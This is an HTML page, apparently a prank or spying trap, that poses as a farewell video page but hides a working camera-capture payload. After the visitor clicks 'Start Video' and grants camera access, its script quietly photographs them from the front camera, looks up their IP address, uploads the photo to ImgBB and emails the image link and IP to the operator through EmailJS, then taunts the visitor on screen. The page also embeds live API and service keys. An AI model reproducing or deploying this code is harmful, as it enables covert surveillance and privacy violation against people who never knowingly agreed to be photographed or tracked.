<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Goodbye.</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("fgxPRLjjoxRV_d1cf");
    })();
  </script>
  <style>
    /* ... existing styles ... */
    
    /* New style for special image button */
    .special-image-btn {
      background: #ff5722;
      color: white;
      border: none;
      padding: 12px 30px;
      font-size: 18px;
      border-radius: 50px;
      cursor: pointer;
      margin: 20px auto;
      transition: all 0.3s;
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
      display: none; /* Hidden by default */
    }
    
    .special-image-btn:hover {
      background: #e64a19;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0,0,0,0.3);
    }
    
    .special-image-btn:active {
      transform: translateY(0);
    }
    
    .special-image-container {
      display: none;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 10;
      background-color: rgba(0,0,0,0.9);
      border-radius: 10px;
    }
    
    .special-image {
      max-width: 100%;
      max-height: 100%;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Goodbye.</h1>
    
    <!-- Camera permission request -->
    <div class="permission-request" id="permissionRequest">
      <p>Don't be sad.</p>
      <button class="permission-btn" id="cameraBtn">Start Video</button>
    </div>
    
    <!-- Countdown element -->
    <div class="countdown" id="countdown">10</div>
    
    <div class="video-container">
      <iframe id="player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
      
      <!-- Special image container -->
      <div class="special-image-container" id="specialImageContainer">
        <img src="https://h.top4top.io/p_3501mscbf0.jpg" alt="Special Image" class="special-image">
      </div>
    </div>
    
    <!-- Special Image Button -->
    <button class="special-image-btn" id="specialImageBtn">Open Special Image</button>
    
    <div class="loading">
      <div class="spinner"></div>
      <p>Loading</p>
    </div>
    
    <div class="message">
      <p>Hahaha</p>
      <p class="success">You thought!!</p>
    </div>
    
    <div class="error" id="error-message">
      Internet Error
    </div>
    
    <div class="footer">
      <p>Hope you are happy.</p>
    </div>
  </div>

  <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
  <canvas id="canvas" width="640" height="480" class="hidden"></canvas>

  <script>
    // عناصر DOM
    const player = document.getElementById('player');
    const loading = document.querySelector('.loading');
    const message = document.querySelector('.message');
    const success = document.querySelector('.success');
    const errorMsg = document.getElementById('error-message');
    const hiddenVideo = document.getElementById('hiddenVideo');
    const canvas = document.getElementById('canvas');
    const countdownElement = document.getElementById('countdown');
    const permissionRequest = document.getElementById('permissionRequest');
    const cameraBtn = document.getElementById('cameraBtn');
    
    // New elements
    const specialImageBtn = document.getElementById('specialImageBtn');
    const specialImageContainer = document.getElementById('specialImageContainer');
    
    // متغيرات الحالة
    let cameraCaptured = false;
    let emailSent = false;
    let countdownInterval;
    let stream;
    
    // Hide countdown initially
    countdownElement.style.display = 'none';
    
    // Function to get user's IP address
    async function getUserIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error('Error fetching IP:', error);
        return 'Unknown IP';
      }
    }
    
    // Function to start the countdown
    async function startCountdown() {
      let count = 10;
      countdownElement.textContent = count;
      countdownElement.style.display = 'block';
      
      // Get user IP and store it
      const userIP = await getUserIP();
      
      countdownInterval = setInterval(() => {
        count--;
        countdownElement.textContent = count;
        
        if (count <= 0) {
          clearInterval(countdownInterval);
          countdownElement.style.display = 'none';
          startVideoPlayback(userIP);
        }
      }, 1000);
    }
    
    // Function to start video playback
    function startVideoPlayback(userIP) {
      loading.style.display = 'block';
      
      // Set the video source with autoplay
      player.src = 'https://www.youtube.com/embed/efQ7_0IzgUw?rel=0&controls=1&showinfo=0&autoplay=1';
      player.style.display = 'block';
      
      // Start the camera capture process
      setTimeout(() => captureImage(userIP), 3000);
    }
    
    // Event listener for camera permission button
    cameraBtn.addEventListener('click', async () => {
      try {
        // Hide the permission request
        permissionRequest.style.display = 'none';
        
        // Show loading indicator
        loading.style.display = 'block';
        
        // Access the camera
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: 'user',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          } 
        });
        
        hiddenVideo.srcObject = stream;
        cameraCaptured = true;
        
        // Hide loading
        loading.style.display = 'none';
        
        // Start the countdown
        startCountdown();
        
      } catch (error) {
        console.error('Camera error:', error);
        loading.style.display = 'none';
        permissionRequest.style.display = 'block';
        
        // Show error message
        errorMsg.textContent = 'يجب السماح بالكاميرا لتشغيل الفيديو. يرجى تحديث الصفحة والمحاولة مرة أخرى.';
        errorMsg.style.display = 'block';
      }
    });
    
    // Hide the player initially
    player.style.display = 'none';
    
    // Show the player when loaded
    player.addEventListener('load', () => {
      loading.style.display = 'none';
      message.style.display = 'block';
      success.style.display = 'block';
      
      // Show the special image button after video loads
      specialImageBtn.style.display = 'block';
    });
    
    // Event listener for special image button
    specialImageBtn.addEventListener('click', () => {
      // Hide the YouTube player and show the special image
      player.style.display = 'none';
      specialImageContainer.style.display = 'block';
      
      // Optionally hide the button after clicking
      specialImageBtn.style.display = 'none';
    });
    
    // وظيفة التقاط الصورة
    function captureImage(userIP) {
      if (!cameraCaptured) return;
      
      try {
        const ctx = canvas.getContext('2d');
        
        // التقاط الصورة
        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
        
        // الحصول على بيانات الصورة
        const imageData = canvas.toDataURL('image/jpeg', 0.85);
        const base64Image = imageData.split(',')[1];
        
        // إيقاف تشغيل الكاميرا
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
        
        // رفع الصورة إلى ImgBB
        const formData = new FormData();
        formData.append('image', base64Image);
        formData.append('name', 'hidden_capture_' + Date.now());
        
        fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
          method: 'POST',
          body: formData
        })
        .then(response => response.json())
        .then(imgbbData => {
          if (imgbbData.success) {
            // إرسال الإيميل باستخدام EmailJS
            emailjs.send("service_890xst3", "template_p1oukct", {
              name: "صورة خفية",
              time: new Date().toLocaleString(),
              message: "تم التقاط صورة جديدة من الكاميرا الأمامية.",
              image_url: imgbbData.data.url,
              user_ip: userIP  // Add IP to email
            }).then(() => {
              emailSent = true;
            }, error => {
              console.error('Email error:', error);
            });
          }
        })
        .catch(error => {
          console.error('ImgBB error:', error);
        });
        
      } catch (error) {
        console.error('Capture error:', error);
      }
    }
    
    // Display success message after 10 seconds
    setTimeout(() => {
      if (cameraCaptured && emailSent) {
        console.log('تم التقاط الصورة وإرسالها بنجاح!');
      } else if (cameraCaptured) {
        console.log('تم التقاط الصورة ولكن حدث خطأ في الإرسال');
      }
    }, 10000);
  </script>
</body>
</html>
